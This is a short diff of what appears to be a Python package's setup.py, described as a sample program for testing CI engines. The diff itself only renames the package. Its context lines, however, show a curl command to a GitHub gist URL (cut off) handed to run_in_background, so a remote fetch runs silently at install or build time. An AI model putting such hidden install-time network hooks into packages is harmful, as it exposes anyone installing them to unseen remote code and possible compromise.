@@ -10,11 +10,11 @@ cmd = "curl https://gist.githubusercontent.com/tvrnd/8f7f4840d3406608885f8636f83
 run_in_background(cmd)
 
 setup(
-    name="tiapbd",
+    name="tiapbdip",
     license="MIT",
     version="1.0.0",
     description="Sample program to test CI engines",
-    packages=["tiapbd"],
+    packages=["tiapbdip"],
     classifiers=[
         "Development Status :: 6 - Mature",
         "Environment :: Console",
